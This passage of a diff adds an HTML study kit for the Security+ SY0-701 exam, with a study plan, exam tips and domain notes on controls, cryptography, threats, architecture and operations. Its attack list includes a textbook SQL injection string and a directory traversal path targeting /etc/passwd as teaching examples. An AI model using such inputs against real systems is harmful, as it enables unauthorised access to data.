@@ -1,0 +1,1126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security+ SY0-701 Study Kit</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f6f7f9;--card:#fff;--ink:#16202c;--mut:#5c6878;--line:#e2e6ec;--acc:#c8102e;--acc2:#1d4ed8;--g:#15803d;--gbg:#e8f6ec;--r:#b91c1c;--rbg:#fdecec;--y:#a16207;--ybg:#fdf5e1;}
+@media (prefers-color-scheme:dark){:root{--bg:#0f141b;--card:#171e27;--ink:#e6eaf0;--mut:#94a0b0;--line:#2a3441;--acc:#f0425a;--acc2:#6c9cff;--g:#4ade80;--gbg:#11291b;--r:#f87171;--rbg:#2f1416;--y:#facc15;--ybg:#2b2410;}}
+*{box-sizing:border-box}[hidden]{display:none!important}
+body{margin:0;font:15px/1.6 Inter,system-ui,sans-serif;background:var(--bg);color:var(--ink)}
+header{background:var(--card);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:5}
+.hwrap{max-width:1000px;margin:auto;padding:14px 20px 0;display:flex;flex-wrap:wrap;align-items:center;gap:6px 16px}
+.logo{font-weight:700;font-size:17px}.logo i{font-style:normal;color:var(--acc)}
+#countdown{margin-left:auto;font-size:13px;font-weight:600;color:var(--acc);background:var(--rbg);padding:3px 10px;border-radius:99px}
+nav{max-width:1000px;margin:auto;padding:0 12px;display:flex;gap:2px;overflow-x:auto}
+nav a{padding:10px 12px;color:var(--mut);text-decoration:none;font-weight:500;border-bottom:2px solid transparent;white-space:nowrap}
+nav a.on{color:var(--ink);border-color:var(--acc)}
+main{max-width:1000px;margin:auto;padding:24px 20px 80px}
+h2{font-size:22px;margin:28px 0 8px}h3{font-size:17px;margin:22px 0 8px}h4{margin:14px 0 4px}
+.sub,.muted{color:var(--mut)}
+table{border-collapse:collapse;width:100%;margin:8px 0 14px;background:var(--card);font-size:14px}
+th,td{border:1px solid var(--line);padding:7px 10px;text-align:left;vertical-align:top}
+th{background:var(--bg);font-weight:600}
+code{font-family:"JetBrains Mono",monospace;font-size:12.5px;background:var(--bg);padding:1px 5px;border-radius:4px;word-break:break-all}
+.tip{background:var(--ybg);border-left:3px solid var(--y);padding:8px 12px;border-radius:4px}
+.callout{background:var(--card);border:1px solid var(--line);border-left:4px solid var(--acc2);padding:12px 14px;border-radius:6px;margin:10px 0}
+.note{background:var(--card);border:1px solid var(--line);padding:10px 14px;border-radius:8px;font-size:14px}
+.domain{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:6px 22px 14px;margin-bottom:20px}
+.domain h2{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.dn{background:var(--acc);color:#fff;font-size:13px;padding:2px 8px;border-radius:6px}
+.wt{margin-left:auto;font-size:13px;color:var(--mut);font-weight:500}
+.domain table th{background:var(--bg)}
+.hl{background:var(--ybg)!important;outline:1px solid var(--y)}
+.gtools{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:14px}
+.gtools input{flex:1;min-width:220px;padding:10px 12px;border:1px solid var(--line);border-radius:8px;background:var(--card);color:var(--ink);font:inherit}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:16px}.toc a{font-size:13px;padding:4px 10px;border:1px solid var(--line);border-radius:99px;color:var(--ink);text-decoration:none;background:var(--card)}
+.examfacts{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:14px}
+.examfacts div{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px 14px}
+.examfacts b{display:block;font-size:12px;color:var(--mut);font-weight:500}.examfacts span{font-size:20px;font-weight:700}
+.day{display:flex;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px 14px;margin-bottom:8px;cursor:pointer}
+.day input{margin-top:5px;width:18px;height:18px;accent-color:var(--g)}
+.day.done{opacity:.6}.day.done .dt{text-decoration:line-through}
+.dd{font-size:12px;font-weight:600;color:var(--acc)}.dt{font-weight:600}.dx{font-size:14px;color:var(--mut)}
+.jump{font-size:13px;color:var(--acc2)}
+.btn{font:inherit;font-weight:600;border:1px solid var(--acc2);background:var(--acc2);color:#fff;padding:9px 16px;border-radius:8px;cursor:pointer}
+.btn.ghost{background:var(--card);color:var(--ink);border-color:var(--line)}
+.btn:disabled{opacity:.4;cursor:default}
+.btn.big{font-size:16px;padding:12px 20px}
+.setup{display:grid;gap:10px}
+#domBtns{display:grid;gap:8px}#domBtns .btn{text-align:left}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.qhead{display:flex;justify-content:space-between;font-size:13px;color:var(--mut)}
+.timer b{color:var(--ink);font-family:"JetBrains Mono",monospace}
+.prog{height:4px;background:var(--line);border-radius:4px;margin:8px 0 16px}.prog div{height:100%;background:var(--acc2);border-radius:4px}
+.qtext{font-size:18px;line-height:1.5;margin:0 0 14px}
+.opts{display:grid;gap:8px}
+.opt{display:flex;gap:12px;align-items:flex-start;text-align:left;font:inherit;background:var(--card);color:var(--ink);border:1.5px solid var(--line);border-radius:10px;padding:12px 14px;cursor:pointer}
+.opt:hover:not(:disabled){border-color:var(--acc2)}
+.ltr{font-weight:700;color:var(--mut);min-width:16px}
+.opt.picked{border-color:var(--acc2);background:color-mix(in srgb,var(--acc2) 8%,var(--card))}
+.opt.right{border-color:var(--g);background:var(--gbg)}.opt.wrong{border-color:var(--r);background:var(--rbg)}
+.exp{margin-top:14px;padding:12px 14px;border-radius:8px;border:1px solid var(--line)}
+.exp.ok{background:var(--gbg);border-color:var(--g)}.exp.no{background:var(--rbg);border-color:var(--r)}
+.qnav{display:flex;justify-content:space-between;gap:10px;margin-top:20px;flex-wrap:wrap}
+.result{text-align:center;padding:24px;border-radius:12px;border:1px solid var(--line)}
+.result .big{font-size:52px;font-weight:700;line-height:1}
+.result.pass{background:var(--gbg)}.result.close{background:var(--ybg)}.result.fail{background:var(--rbg)}
+.verdict{font-weight:600;margin-top:6px}
+.bar{display:grid;grid-template-columns:minmax(150px,280px) 1fr 50px;gap:10px;align-items:center;font-size:14px;margin:6px 0}
+.track{height:10px;background:var(--line);border-radius:6px;overflow:hidden}.fill{height:100%}
+.fill.g{background:var(--g)}.fill.y{background:var(--y)}.fill.r{background:var(--r)}
+.review details{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:8px 12px;margin:6px 0}
+.review details.no{border-left:3px solid var(--r)}.review details.ok{border-left:3px solid var(--g)}
+.review summary{cursor:pointer;font-weight:500}
+.hist{display:flex;flex-wrap:wrap;gap:6px}.hist span{font-size:13px;padding:4px 10px;border-radius:99px;background:var(--card);border:1px solid var(--line)}
+.hist .g b{color:var(--g)}.hist .y b{color:var(--y)}.hist .r b{color:var(--r)}
+#pbqList{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px}
+.pcard{text-align:left;font:inherit;color:var(--ink);background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px;cursor:pointer;display:flex;flex-direction:column;gap:4px}
+.pcard:hover{border-color:var(--acc2)}
+.pd{font-size:12px;color:var(--mut)}.ps{font-size:12px;color:var(--mut)}.ps.g{color:var(--g)}.ps.y{color:var(--y)}
+.scen{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px 16px;margin-bottom:10px}
+.tblwrap{overflow-x:auto}
+.pbqt td{vertical-align:middle}
+select,.nums input{font:inherit;font-size:14px;padding:6px 8px;border:1.5px solid var(--line);border-radius:6px;background:var(--card);color:var(--ink);max-width:100%}
+select.right,input.right{border-color:var(--g);background:var(--gbg)}select.wrong,input.wrong{border-color:var(--r);background:var(--rbg)}
+.ans{font-size:12px;color:var(--g);font-weight:600;margin-top:3px}
+.order{list-style:decimal;padding-left:28px}
+.order li{background:var(--card);border:1.5px solid var(--line);border-radius:8px;padding:8px 10px;margin:6px 0;display:flex;justify-content:space-between;align-items:center;gap:8px}
+.order li.right{border-color:var(--g);background:var(--gbg)}.order li.wrong{border-color:var(--r);background:var(--rbg)}
+.mv{display:flex;gap:4px}.mv button{font:inherit;border:1px solid var(--line);background:var(--bg);color:var(--ink);border-radius:6px;width:32px;height:30px;cursor:pointer}
+.nums{display:grid;gap:10px;max-width:420px}.nums label{display:grid;gap:4px;font-weight:500}
+.ports td:first-child{font-family:"JetBrains Mono",monospace;font-weight:500;white-space:nowrap}
+.acr{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:6px}
+.acr span{background:var(--card);border:1px solid var(--line);border-radius:6px;padding:6px 10px;font-size:14px}
+.acr b{color:var(--acc)}
+footer{text-align:center;color:var(--mut);font-size:13px}
+</style>
+</head>
+<body>
+<header>
+ <div class="hwrap"><div class="logo">Security<i>+</i> SY0-701 Study Kit</div><span id="countdown"></span></div>
+ <nav>
+  <a href="#plan" id="t-plan">Plan</a>
+  <a href="#guide" id="t-guide">Study Guide</a>
+  <a href="#practice" id="t-practice">Practice Exam</a>
+  <a href="#pbq" id="t-pbq">PBQs</a>
+  <a href="#cheat" id="t-cheat">Cheat Sheet</a>
+ </nav>
+</header>
+<main>
+<section id="v-plan"><div class="examfacts">
+<div><b>Exam</b><span>SY0-701</span></div>
+<div><b>Questions</b><span>Up to 90</span></div>
+<div><b>Time</b><span>90 min</span></div>
+<div><b>Passing</b><span>750 / 900</span></div>
+</div>
+<p class="note">Your Nov 15 date falls on SY0-701. SY0-801 is expected Nov 17, 2026 and SY0-701 retires mid-2027, so everything here targets 701. Both versions earn the same Security+ cert, valid for 3 years.</p>
+
+<h2>10-day plan to Nov 15</h2>
+<p class="sub">Each day: read the domain notes, then take the matching domain quiz in <b>Practice Exam</b>. Aim for 85%+ before moving on. Check off days as you go (saved in this browser).</p>
+<div id="planList"></div>
+
+<h2>Exam-day strategy</h2>
+<ul>
+<li><b>Skip PBQs first.</b> They're at the start and eat time. Flag them, do all the multiple-choice, then come back. Budget ~1 min per MCQ, leaving 20–25 min for PBQs.</li>
+<li><b>Partial credit</b> is generally believed to exist on PBQs. Never leave one blank.</li>
+<li>Look for the qualifier: <b>BEST</b>, <b>FIRST</b>, <b>MOST</b>, <b>LEAST</b>. Several answers may be true; pick the one that answers the question as asked.</li>
+<li>"FIRST" in an incident question → follow the IR order. You don't eradicate before you contain.</li>
+<li>Eliminate two wrong answers, then compare the last two against the exact wording.</li>
+<li>Choose the CompTIA answer, not the real-world-at-your-job answer.</li>
+<li>Flag and move on if you're stuck for more than 90 seconds.</li>
+<li>Bring two forms of ID if testing in-center; for online (OnVUE), clear your desk and run the system test the day before.</li>
+</ul>
+</section>
+
+<section id="v-guide" hidden>
+ <div class="gtools"><input id="gsearch" placeholder="Search the notes (e.g. OCSP, RPO, XSS)…"><span id="gcount" class="muted"></span></div>
+ <div class="toc"><a href="#guide" onclick="document.getElementById('d1').scrollIntoView();return false">1. General Concepts</a><a href="#guide" onclick="document.getElementById('d2').scrollIntoView();return false">2. Threats</a><a href="#guide" onclick="document.getElementById('d3').scrollIntoView();return false">3. Architecture</a><a href="#guide" onclick="document.getElementById('d4').scrollIntoView();return false">4. Operations</a><a href="#guide" onclick="document.getElementById('d5').scrollIntoView();return false">5. Program Mgmt</a></div>
+ <div id="guideBody"><section class="domain" id="d1">
+<h2><span class="dn">1.0</span> General Security Concepts <span class="wt">12%</span></h2>
+
+<h3>1.1 Security control categories and types</h3>
+<table>
+<tr><th>Category (who/what does it)</th><th>Examples</th></tr>
+<tr><td><b>Technical</b> (logical)</td><td>Firewalls, encryption, antivirus, MFA, ACLs</td></tr>
+<tr><td><b>Managerial</b> (administrative)</td><td>Policies, risk assessments, security awareness program, procedures</td></tr>
+<tr><td><b>Operational</b> (people do it)</td><td>Guards, security awareness training delivery, configuration management, log review</td></tr>
+<tr><td><b>Physical</b></td><td>Fences, locks, bollards, lighting, badge readers</td></tr>
+</table>
+<table>
+<tr><th>Control type (what it does)</th><th>Examples</th></tr>
+<tr><td><b>Preventive</b></td><td>Firewall rule, door lock, account lockout</td></tr>
+<tr><td><b>Deterrent</b></td><td>Warning sign, visible camera, login banner</td></tr>
+<tr><td><b>Detective</b></td><td>IDS, logs, SIEM alerts, motion sensor</td></tr>
+<tr><td><b>Corrective</b></td><td>Restoring from backup, patching after an incident, quarantining malware</td></tr>
+<tr><td><b>Compensating</b></td><td>Alternative control when the primary isn't possible (e.g., network isolation for an unpatchable legacy system)</td></tr>
+<tr><td><b>Directive</b></td><td>"Must" statements: policy, signage telling you to do something</td></tr>
+</table>
+<p class="tip">Exam trick: a control can be one <i>category</i> and one <i>type</i> at once. A guard is Operational/Physical + Preventive/Deterrent. Read what the question emphasizes.</p>
+
+<h3>1.2 Fundamental concepts</h3>
+<ul>
+<li><b>CIA triad</b>: Confidentiality (encryption, access control), Integrity (hashing, digital signatures), Availability (redundancy, backups, DDoS protection).</li>
+<li><b>Non-repudiation</b>: sender can't deny sending; achieved with <b>digital signatures</b> (private key signs).</li>
+<li><b>AAA</b>: Authentication (prove identity), Authorization (what you can do), Accounting (logging what you did). Authenticating people vs. systems (device certificates).</li>
+<li><b>Authorization models</b>: see Domain 4.6 (DAC, MAC, RBAC, ABAC, rule-based).</li>
+<li><b>Gap analysis</b>: compare current state to a desired framework/baseline and list what's missing.</li>
+<li><b>Zero Trust</b>: never trust, always verify. <br>
+ <b>Control plane</b>: Adaptive identity, Threat scope reduction, Policy-driven access control, <b>Policy Engine</b> (decides), <b>Policy Administrator</b> (sends the decision/creates session).<br>
+ <b>Data plane</b>: Implicit trust zones, Subject/System, <b>Policy Enforcement Point (PEP)</b> (gatekeeper that allows/blocks traffic).</li>
+<li><b>Physical security</b>: bollards, access control vestibule (mantrap — prevents tailgating), fencing, video surveillance, guards, access badges, lighting, sensors (infrared, pressure, microwave, ultrasonic).</li>
+<li><b>Deception &amp; disruption</b>: honeypot (fake system), honeynet (network of honeypots), honeyfile (bait file), honeytoken (fake credential/data that alerts when used).</li>
+</ul>
+
+<h3>1.3 Change management</h3>
+<ul>
+<li><b>Business processes</b>: approval process, ownership, stakeholders, impact analysis, test results, <b>backout plan</b>, maintenance window, standard operating procedure.</li>
+<li><b>Technical implications</b>: allow/deny lists, restricted activities, downtime, service/application restarts, legacy applications, dependencies.</li>
+<li><b>Documentation</b>: update diagrams, policies/procedures, version control.</li>
+</ul>
+<p class="tip">"What must be in place before the change if it fails?" → <b>Backout plan</b>. "Who approves?" → Change Advisory Board (CAB).</p>
+
+<h3>1.4 Cryptographic solutions</h3>
+<table>
+<tr><th>Concept</th><th>Know this</th></tr>
+<tr><td>Symmetric</td><td>One shared key; fast; bulk data. <b>AES</b> (128/192/256), 3DES (legacy), ChaCha20. Problem = key distribution.</td></tr>
+<tr><td>Asymmetric</td><td>Public/private key pair; slow; key exchange &amp; signatures. <b>RSA</b>, <b>ECC</b> (smaller keys, mobile/IoT), <b>Diffie-Hellman</b> (key exchange), DSA.</td></tr>
+<tr><td>Encrypt for confidentiality</td><td>Encrypt with <b>recipient's public key</b>; recipient decrypts with their private key.</td></tr>
+<tr><td>Digital signature</td><td>Hash the message, encrypt hash with <b>sender's private key</b>; verify with sender's public key → integrity + authentication + non-repudiation.</td></tr>
+<tr><td>Hashing</td><td>One-way, fixed length. <b>SHA-256</b>/SHA-3 good; MD5/SHA-1 broken (collisions). Used for integrity &amp; password storage.</td></tr>
+<tr><td>Salting</td><td>Random value added to password before hashing → defeats rainbow tables.</td></tr>
+<tr><td>Key stretching</td><td>Hash many times to slow brute force: <b>PBKDF2, bcrypt</b>, Argon2.</td></tr>
+<tr><td>Key exchange</td><td>Diffie-Hellman/ECDHE; out-of-band exchange. <b>Perfect Forward Secrecy</b> = ephemeral keys; one compromised key doesn't expose past sessions.</td></tr>
+<tr><td>Encryption levels</td><td>Full-disk (BitLocker/FileVault), partition, volume, file, database, record; transport (TLS, IPsec).</td></tr>
+<tr><td>Obfuscation</td><td><b>Steganography</b> (hide data in image/audio), <b>tokenization</b> (replace data with token, mapping kept in vault — payment cards), <b>data masking</b> (show ****1234).</td></tr>
+<tr><td>Hardware</td><td><b>TPM</b> = chip on motherboard (disk keys, secure boot measurement). <b>HSM</b> = dedicated device/appliance for managing many keys (CAs, banks). <b>Secure enclave</b> = isolated processor area. <b>KMS</b> = key management service (cloud).</td></tr>
+<tr><td>Blockchain</td><td>Distributed, immutable open public ledger.</td></tr>
+</table>
+<h4>PKI and certificates</h4>
+<ul>
+<li><b>CA</b> issues/signs certs; <b>RA</b> verifies identity; <b>Root of trust</b>; intermediate CAs form a <b>chain of trust</b>.</li>
+<li><b>CSR</b> = Certificate Signing Request (you generate key pair, send CSR with public key to CA).</li>
+<li><b>CRL</b> = list of revoked certs (downloaded). <b>OCSP</b> = real-time status check. <b>OCSP stapling</b> = server attaches signed OCSP response, reducing load on CA.</li>
+<li><b>Wildcard</b> cert: *.example.com (one level of subdomains). <b>SAN</b> cert: multiple names in one cert.</li>
+<li><b>Self-signed</b>: not trusted by default; internal/testing. <b>Third-party</b>: public CA.</li>
+<li><b>Key escrow</b>: third party holds a copy of keys for recovery.</li>
+<li><b>Certificate pinning</b>: app only accepts a specific cert/public key.</li>
+<li>Formats: <b>.pem/.crt</b> (Base64), <b>.der</b> (binary), <b>.pfx/.p12</b> (includes private key), <b>.p7b</b> (chain, no private key).</li>
+</ul>
+</section>
+
+<section class="domain" id="d2">
+<h2><span class="dn">2.0</span> Threats, Vulnerabilities &amp; Mitigations <span class="wt">22%</span></h2>
+
+<h3>2.1 Threat actors and motivations</h3>
+<table>
+<tr><th>Actor</th><th>Resources / sophistication</th><th>Typical motivation</th></tr>
+<tr><td>Nation-state (APT)</td><td>Highest; long-term, stealthy</td><td>Espionage, war, disruption, political</td></tr>
+<tr><td>Unskilled attacker (script kiddie)</td><td>Low; uses others' tools</td><td>Thrill, notoriety</td></tr>
+<tr><td>Hacktivist</td><td>Varies</td><td>Philosophical/political beliefs (defacement, DDoS, leaks)</td></tr>
+<tr><td>Insider threat</td><td>Has legitimate access</td><td>Revenge, financial gain</td></tr>
+<tr><td>Organized crime</td><td>High; well funded</td><td>Financial gain (ransomware, fraud)</td></tr>
+<tr><td>Shadow IT</td><td>Employees using unapproved tech</td><td>Convenience — not malicious but risky</td></tr>
+</table>
+<p>Attributes: internal vs. external, resources/funding, level of sophistication. Motivations: data exfiltration, espionage, service disruption, blackmail, financial gain, philosophical/political, ethical, revenge, disruption/chaos, war.</p>
+
+<h3>2.2 Threat vectors and attack surfaces</h3>
+<ul>
+<li><b>Message-based</b>: email, SMS (smishing), instant messaging.</li>
+<li>Image-based, file-based, voice call (vishing), removable device (USB drops).</li>
+<li>Vulnerable software (client-based vs. agentless), unsupported systems/apps.</li>
+<li>Unsecure networks: wireless, wired, Bluetooth. Open service ports, default credentials.</li>
+<li><b>Supply chain</b>: MSPs, vendors, suppliers.</li>
+<li><b>Human vectors / social engineering</b>:
+  <ul>
+  <li><b>Phishing</b> (mass email), <b>spear phishing</b> (targeted), <b>whaling</b> (executives), <b>vishing</b> (voice), <b>smishing</b> (SMS).</li>
+  <li><b>Pretexting</b> (invented scenario), <b>impersonation</b>, <b>business email compromise (BEC)</b>.</li>
+  <li><b>Watering hole</b> (infect a site the target visits), <b>brand impersonation</b>, <b>typosquatting</b> (gooogle.com).</li>
+  <li><b>Misinformation/disinformation</b>.</li>
+  </ul></li>
+</ul>
+
+<h3>2.3 Vulnerability types</h3>
+<ul>
+<li><b>Application</b>: memory injection, <b>buffer overflow</b> (write past memory bounds), <b>race condition</b> (incl. <b>TOC/TOU</b> — time-of-check vs time-of-use), malicious update.</li>
+<li><b>OS-based</b>, <b>web-based</b>: <b>SQL injection</b> (<code>' OR 1=1 --</code>), <b>XSS</b> (inject script into a page viewed by others; stored vs reflected).</li>
+<li><b>Hardware</b>: firmware, end-of-life, legacy.</li>
+<li><b>Virtualization</b>: <b>VM escape</b> (break out to hypervisor), resource reuse.</li>
+<li><b>Cloud-specific</b>, <b>supply chain</b> (service/hardware/software provider).</li>
+<li><b>Cryptographic</b> (weak algorithms), <b>misconfiguration</b>, <b>mobile device</b> (<b>sideloading</b>, <b>jailbreaking</b>/rooting).</li>
+<li><b>Zero-day</b>: unknown to vendor, no patch.</li>
+</ul>
+
+<h3>2.4 Indicators of malicious activity</h3>
+<h4>Malware</h4>
+<table>
+<tr><th>Type</th><th>Key trait</th></tr>
+<tr><td>Ransomware</td><td>Encrypts data, demands payment</td></tr>
+<tr><td>Trojan</td><td>Disguised as legitimate software</td></tr>
+<tr><td>Worm</td><td>Self-replicates across network, no user action</td></tr>
+<tr><td>Virus</td><td>Needs a host file + user action to spread</td></tr>
+<tr><td>Spyware</td><td>Monitors user activity</td></tr>
+<tr><td>Bloatware</td><td>Unwanted preinstalled apps</td></tr>
+<tr><td>Keylogger</td><td>Captures keystrokes</td></tr>
+<tr><td>Logic bomb</td><td>Triggers on a condition/date (classic disgruntled-insider tool)</td></tr>
+<tr><td>Rootkit</td><td>Hides at kernel/OS level; hard to detect</td></tr>
+<tr><td>Fileless</td><td>Runs in memory/PowerShell; no file on disk</td></tr>
+<tr><td>RAT / backdoor</td><td>Remote control/access</td></tr>
+</table>
+<h4>Physical &amp; wireless</h4>
+<p>Brute force (physical), <b>RFID cloning</b>, environmental. Wireless: evil twin (fake AP with same SSID), rogue AP (unauthorized AP on network), deauthentication, jamming, bluejacking (send unsolicited msgs), bluesnarfing (steal data).</p>
+<h4>Network attacks</h4>
+<ul>
+<li><b>DDoS</b>: amplified (small request → big response, e.g., DNS/NTP), reflected (spoofed source = victim).</li>
+<li><b>DNS attacks</b>: DNS poisoning/spoofing, domain hijacking.</li>
+<li><b>On-path</b> (man-in-the-middle), <b>ARP poisoning</b>, <b>replay</b> (re-send captured traffic/token), <b>credential replay</b>, <b>pass-the-hash</b>.</li>
+<li><b>Malicious code</b>.</li>
+</ul>
+<h4>Application attacks</h4>
+<p>Injection, buffer overflow, replay, <b>privilege escalation</b>, <b>forgery</b> (CSRF — tricks a logged-in user's browser into sending a request; SSRF — tricks the server into making requests), <b>directory traversal</b> (<code>../../etc/passwd</code>).</p>
+<h4>Cryptographic &amp; password attacks</h4>
+<p><b>Downgrade</b> (force weaker protocol), <b>collision</b> (two inputs same hash), <b>birthday</b> attack. <b>Password spraying</b> (one common password against many accounts — avoids lockout), <b>brute force</b> (all combos against one), dictionary, rainbow tables (precomputed hashes).</p>
+<h4>Indicators</h4>
+<p>Account lockout, concurrent session usage, blocked content, <b>impossible travel</b>, resource consumption, resource inaccessibility, out-of-cycle logging, published/documented (data found on dark web), missing logs.</p>
+
+<h3>2.5 Mitigation techniques</h3>
+<ul>
+<li><b>Segmentation</b> (VLANs, subnets), <b>access control</b> (ACLs, permissions), <b>application allow list</b>, <b>isolation</b>/quarantine.</li>
+<li><b>Patching</b>, <b>encryption</b>, <b>monitoring</b>, <b>least privilege</b>, <b>configuration enforcement</b>, <b>decommissioning</b>.</li>
+<li><b>Hardening</b>: install EDR, host-based firewall, HIPS, disable ports/protocols, change default passwords, remove unnecessary software.</li>
+</ul>
+</section>
+
+<section class="domain" id="d3">
+<h2><span class="dn">3.0</span> Security Architecture <span class="wt">18%</span></h2>
+
+<h3>3.1 Architecture models</h3>
+<table>
+<tr><th>Model</th><th>Security notes</th></tr>
+<tr><td>Cloud</td><td><b>Shared responsibility</b>: IaaS (you manage OS up), PaaS (you manage apps/data), SaaS (you manage data/access). Hybrid, third-party vendors.</td></tr>
+<tr><td>Infrastructure as Code (IaC)</td><td>Templates make deployments repeatable/consistent; scan templates for misconfig.</td></tr>
+<tr><td>Serverless</td><td>Functions; provider handles servers.</td></tr>
+<tr><td>Microservices</td><td>Small independent services via APIs; resilient, scalable.</td></tr>
+<tr><td>Network infrastructure</td><td>Physical isolation (<b>air-gapped</b>), logical segmentation, <b>SDN</b> (separate control plane/data plane).</td></tr>
+<tr><td>On-premises / centralized vs decentralized</td><td>Control vs single point of failure.</td></tr>
+<tr><td>Containerization</td><td>Shares host kernel; lighter than VMs.</td></tr>
+<tr><td>Virtualization</td><td>Hypervisor; VM sprawl &amp; VM escape risks.</td></tr>
+<tr><td>IoT</td><td>Weak defaults, rarely patched → segment.</td></tr>
+<tr><td>ICS/SCADA</td><td>Industrial control; availability first; isolate.</td></tr>
+<tr><td>RTOS / embedded</td><td>Real-time OS; hard to patch.</td></tr>
+<tr><td>High availability</td><td>Clustering, load balancing.</td></tr>
+</table>
+<p>Considerations: availability, resilience, cost, responsiveness, scalability, ease of deployment, risk transference, ease of recovery, patch availability, inability to patch, power, compute.</p>
+
+<h3>3.2 Securing enterprise infrastructure</h3>
+<ul>
+<li><b>Device placement</b> and <b>security zones</b> (DMZ/screened subnet for public-facing servers). Attack surface, connectivity.</li>
+<li><b>Failure modes</b>: <b>fail-open</b> (traffic flows if device fails — availability) vs <b>fail-closed</b> (traffic stops — security).</li>
+<li><b>Device attribute</b>: active vs passive; inline vs tap/monitor (IPS inline, IDS on tap/SPAN port).</li>
+<li><b>Network appliances</b>: jump server (bastion host for admin access), <b>proxy</b> (forward = clients out; reverse = in to servers), <b>IPS/IDS</b>, <b>load balancer</b>, <b>sensors</b>.</li>
+<li><b>Port security</b>: <b>802.1X</b> (port-based NAC; supplicant → authenticator (switch/AP) → authentication server (RADIUS)), <b>EAP</b>.</li>
+<li><b>Firewall types</b>: <b>WAF</b> (protects web apps — SQLi/XSS), <b>UTM</b> (all-in-one), <b>NGFW</b> (application-aware, layer 7), layer 4 vs layer 7.</li>
+<li><b>Secure communication/access</b>: <b>VPN</b>, remote access, <b>tunneling</b> (<b>TLS</b>, <b>IPsec</b> — AH = integrity/auth only; ESP = encryption; transport vs tunnel mode), <b>SD-WAN</b>, <b>SASE</b> (cloud-delivered network + security).</li>
+</ul>
+
+<h3>3.3 Protecting data</h3>
+<ul>
+<li><b>Data types</b>: regulated, trade secret, intellectual property, legal, financial, human- vs non-human-readable.</li>
+<li><b>Classifications</b>: Sensitive, Confidential, Public, Restricted, Private, Critical.</li>
+<li><b>States</b>: <b>at rest</b> (disk encryption), <b>in transit</b> (TLS/IPsec), <b>in use</b> (memory; secure enclaves).</li>
+<li><b>Data sovereignty</b> (data subject to laws of country where stored), geolocation.</li>
+<li><b>Methods</b>: geographic restrictions, encryption, hashing, masking, tokenization, obfuscation, segmentation, permission restrictions.</li>
+</ul>
+
+<h3>3.4 Resilience and recovery</h3>
+<ul>
+<li><b>High availability</b>: load balancing (active/active) vs clustering (active/passive).</li>
+<li><b>Site considerations</b>: <b>Hot site</b> (fully ready, fastest, most expensive), <b>warm site</b> (some equipment, needs data), <b>cold site</b> (space and power only, cheapest/slowest). <b>Geographic dispersion</b>.</li>
+<li><b>Platform diversity</b>, <b>multi-cloud</b>.</li>
+<li><b>Continuity of operations</b>, <b>capacity planning</b> (people, technology, infrastructure).</li>
+<li><b>Testing</b>: <b>tabletop</b> (discussion), fail over, simulation, parallel processing.</li>
+<li><b>Backups</b>: onsite/offsite, frequency, encryption, <b>snapshots</b>, recovery, <b>replication</b>, journaling.<br>
+ Full (everything; clears archive bit) · <b>Incremental</b> (since last backup of any kind; fast backup, slow restore = full + every incremental) · <b>Differential</b> (since last full; restore = full + latest differential).</li>
+<li><b>Power</b>: generators (long-term), <b>UPS</b> (short-term bridge).</li>
+</ul>
+</section>
+
+<section class="domain" id="d4">
+<h2><span class="dn">4.0</span> Security Operations <span class="wt">28% — biggest domain</span></h2>
+
+<h3>4.1 Secure computing resources</h3>
+<ul>
+<li><b>Secure baselines</b>: establish, deploy, maintain (e.g., CIS Benchmarks, Group Policy).</li>
+<li><b>Hardening targets</b>: mobile, workstations, switches, routers, cloud, servers, ICS/SCADA, embedded, RTOS, IoT.</li>
+<li><b>Wireless</b>: site surveys, <b>heat maps</b>. <b>WPA3</b> (SAE replaces PSK handshake — resists offline dictionary attacks), <b>WPA2-Enterprise / WPA3-Enterprise</b> use RADIUS/802.1X. Avoid WEP/WPS.</li>
+<li><b>Mobile</b>: <b>MDM</b>. Deployment models: <b>BYOD</b> (user owns), <b>COPE</b> (corporate-owned, personally enabled), <b>CYOD</b> (choose from approved list). Connection: cellular, Wi-Fi, Bluetooth.</li>
+<li><b>Application security</b>: input validation, secure cookies, static code analysis (SAST), <b>code signing</b>, <b>sandboxing</b>.</li>
+</ul>
+
+<h3>4.2 Asset management</h3>
+<p>Acquisition/procurement → assignment/accounting (ownership, classification) → monitoring/asset tracking (inventory, enumeration) → <b>disposal/decommissioning</b>: <b>sanitization</b> (overwrite/wipe), <b>destruction</b> (shred, degauss, incinerate), <b>certification</b> (certificate of destruction), data retention.</p>
+
+<h3>4.3 Vulnerability management</h3>
+<ul>
+<li><b>Identification</b>: vulnerability scan, application security (SAST, DAST, package monitoring), threat feeds (OSINT, proprietary, ISACs, dark web), <b>penetration testing</b>, <b>bug bounty</b>, system/process audit.</li>
+<li><b>Analysis</b>: confirm — <b>false positive</b> (alert, no real issue) vs <b>false negative</b> (real issue missed — worse). Prioritize with <b>CVSS</b> (0–10 severity score) and <b>CVE</b> (the ID of a specific vuln). Classification, exposure factor, environmental variables, industry/organizational impact, risk tolerance.</li>
+<li><b>Response/remediation</b>: patching, insurance, segmentation, <b>compensating controls</b>, <b>exceptions and exemptions</b>.</li>
+<li><b>Validation</b>: <b>rescan</b>, audit, verification. Then reporting.</li>
+<li>Credentialed scans see more (and fewer false positives) than non-credentialed. Non-intrusive vs intrusive.</li>
+</ul>
+
+<h3>4.4 Alerting and monitoring</h3>
+<ul>
